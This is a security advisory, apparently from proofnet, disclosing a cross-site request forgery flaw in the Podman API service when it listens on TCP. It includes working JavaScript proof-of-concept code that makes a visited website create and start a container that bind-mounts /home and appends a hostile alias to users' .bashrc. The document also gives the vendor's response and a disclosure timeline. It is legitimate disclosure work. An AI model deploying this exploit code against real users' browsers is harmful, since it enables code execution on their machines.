---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-15_podman-api-service-listening-on-tcp-can-be-used-from-websites.md
original_filename: 2023-08-15_podman-api-service-listening-on-tcp-can-be-used-from-websites.md
title: Podman API service listening on TCP can be used from websites
category: documents
detected_topics:
- csrf
- api-security
- command-injection
- cors
- supply-chain
tags:
- imported
- documents
- csrf
- api-security
- command-injection
- cors
- supply-chain
language: en
raw_sha256: d841374d9a88f5dfbdfdb435ea6c76a459cfb202056ca43704acb77a05ab0b0a
text_sha256: 07cb0be062169d27a3b3951a6daa97403d94f46465a3512c238ba606773fe185
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# Podman API service listening on TCP can be used from websites

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-15_podman-api-service-listening-on-tcp-can-be-used-from-websites.md
- Source Type: markdown
- Detected Topics: csrf, api-security, command-injection, cors, supply-chain
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `d841374d9a88f5dfbdfdb435ea6c76a459cfb202056ca43704acb77a05ab0b0a`
- Text SHA256: `07cb0be062169d27a3b3951a6daa97403d94f46465a3512c238ba606773fe185`


## Content

---
title: "Podman API service listening on TCP can be used from websites"
page_title: "Podman API TCP CSRF - proofnet Security Research"
url: "https://proofnet.de/publikationen/podman_tcp_api.html"
final_url: "https://www.proofnet.de/publikationen/podman_tcp_api.html"
authors: ["Dennis Dast"]
programs: ["Podman"]
bugs: ["Container security"]
publication_date: "2023-08-15"
added_date: "2023-08-21"
source: "pentester.land/writeups.json"
original_index: 855
---

## Abstract

[Podman](https://podman.io/) is a tool for running containers. While Podman is used without a daemon most of the time, it also supports running as a daemon / API service, similar to Docker.

The API service either listens on a Unix socket (by default) or a TCP socket. If the API service is used in TCP mode, and even if the service only listens on localhost, arbitrary websites visited in a web browser on the same machine can make use of the provided REST API and effectively gain code execution as the user running the API service.

This cross-site request forgery attack is possible since the REST API allows containers to be created and started via ["simple" HTTP requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) which are not forbidden by the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).

**Since no fix is available users should avoid using the API service in TCP mode.** If the TCP mode is required for some reason it should be made sure by other means that no web browser is able to access the API service.

## Description

If the Podman API service is started in TCP mode e.g. via
  
  
  podman system service --time=0 tcp://localhost:8888

and a web browser is used on the same machine, arbitrary websites accessed in the browser can access the Podman API.

Due to the same-origin policy the website is not allowed to read the responses of the API requests and only "simple" HTTP requests (GET, HEAD, POST with certain Content-Type values) are possible, however, this suffices to, e.g., create and start containers.

The following shows JavaScript snippets that download, create and start a container that modifies the user's .bashrc. The first step is downloading an Alpine container:
  
  
  function downloadContainer() {
  fetch("http://127.0.0.1:8888/images/create?fromImage=docker.io/library/alpine:latest", {
  method: "POST"
  });
  }

In the next step a container named "evilcontainer" is created. The host's /home directory is bind-mounted inside the container and the container will append the line `alias sudo="echo Doing evil stuff"` to the user's .bashrc when it is started:
  
  
  function createContainer() {
  fetch("http://127.0.0.1:8888/containers/create?name=evilcontainer", {
  method: "POST",
  body: JSON.stringify({
  Image: "alpine",
  Entrypoint: [ "/bin/sh", "-c", "echo 'alias sudo=\"echo Doing evil stuff\"' | tee -a /home/*/.bashrc" ],
  HostConfig: {
  Binds: [ "/home:/home" ]
  }
  })
  });
  }

In the last step "evilcontainer" is started:
  
  
  function startContainer() {
  fetch("http://127.0.0.1:8888/containers/evilcontainer/start", {
  method: "POST",
  });
  }

Since the replies are blocked due to the same-origin policy, a timeout is added between each step to make sure each step is finished before the next one is started:
  
  
  function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  async function poc() {
  downloadContainer();
  await sleep(5000);
  createContainer();
  await sleep(2000);
  startContainer();
  }

The complete proof of concept containing these steps can be downloaded [here](../downloads/podman_tcp_api_poc.tar.gz).

Loading the proof of concept from an arbitrary web server triggers the described attack, i.e., the .bashrc of the user running the API server will be modified. Note that at least Chromium requires to use TLS since otherwise access to localhost is blocked.

The proof of concept was confirmed to work on Arch Linux with Podman 4.6.0, Firefox 116.0.2 and Chromium 115.0.5790.170.

## Podman warnings since 4.6.0

We reported this issue to the Podman developers. They decided not to change the behaviour but to change the documentation and warn more explicitly about using the API server via TCP. The documentation changes can be seen in commit [ce73641](https://github.com/containers/podman/commit/ce736413b4fd73f700c9ae400cf2d379ce6a6985).

Before version 4.6.0 no explicit warning was shown when the API server was started via TCP and the man page read:

> Please note that the API grants full access to Podman's capabilities, and allows arbitrary code execution as the user running the API. We strongly recommend against making the API socket available via the network. The default configuration (a Unix socket with permissions set to only allow the user running Podman) is the most secure way of running the API. 

Since version 4.6.0 a message is shown when starting the API server:
  
  
  $ podman system service --time=0 tcp://localhost:8888
  WARN[0000] Using the Podman API service with TCP sockets is not recommended,
  please see `podman system service` manpage for details

The warning in the man page reads:

> Please note that the API grants full access to all Podman functionality, and thus allows arbitrary code execution as the user running the API, with no ability to limit or audit this access. The API's security model is built upon access via a Unix socket with access restricted via standard file permissions, ensuring that only the user running the service will be able to access it. We _strongly_ recommend against making the API socket available via the network (IE, bindings the service to a _tcp_ URL). Even access via Localhost carries risks - anyone with access to the system will be able to access the API. If remote access is required, we instead recommend forwarding the API socket via SSH, and limiting access on the remote machine to the greatest extent possible. If a _tcp_ URL must be used, using the _\--cors_ option is recommended to improve security. 

## Summary

The Podman API service listening on TCP can be accessed by "simple" HTTP requests which are not forbidden by web browser's same-origin policy, making it vulnerable to cross-site request forgery. That means running an API service on TCP (even when listening only on localhost) and using a web browser on the same machine allows websites to effectively execute arbitrary code as the user running the API service. If a TCP API server were exposed via the network then this attack would also be possible from websites visited on other machines in the same network.

## Timeline

  * 2022-11-09: Issue reported to security@lists.podman.io
  * 2022-11-09: Report acknowledged by the Podman developers
  * 2023-01-23: Asked for a status update
  * 2023-02-02: Received a reply that the developers will be following up on the issue
  * 2023-04-19: Asked for a status update
  * 2023-05-25: Asked for a status update
  * 2023-07-06: Asked for a status update, and noted that we are planning to publish a write-up
  * 2023-07-06: Received a reply that it was decided to change the documentation in release 4.6.0
  * 2023-07-21: Podman 4.6.0 was released
  * 2023-07-26: Asked whether it is OK to publish the write-up
  * 2023-08-02: Received the OK to publish the write-up
  * 2023-08-15: Write-up published

[ Zurück zu allen Publikationen ](../blog.html#research)
